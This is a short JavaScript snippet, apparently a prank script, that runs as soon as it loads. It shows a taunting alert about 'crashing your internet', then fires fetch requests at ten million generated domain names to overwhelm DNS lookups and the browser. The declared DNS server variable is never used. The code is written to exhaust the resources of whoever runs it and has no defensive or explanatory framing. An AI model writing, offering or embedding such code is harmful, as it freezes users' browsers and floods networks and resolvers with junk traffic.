function crashDNS() {
    const domains = [];
    for (let i = 0; i < 10000000; i++) {  // 10 million random domains
        domains.push("randomdomain" + i + ".com");
    }

    const dnsServer = "8.8.8.8";  // Google DNS (for illustration)

    for (const domain of domains) {
        fetch("http://" + domain)
            .then(() => console.log("Resolved:", domain))
            .catch(() => console.log("Failed to resolve:", domain));
    }
}

alert("How about you go back to caveman, CRASHING YOUR INTERNET!");
crashDNS();
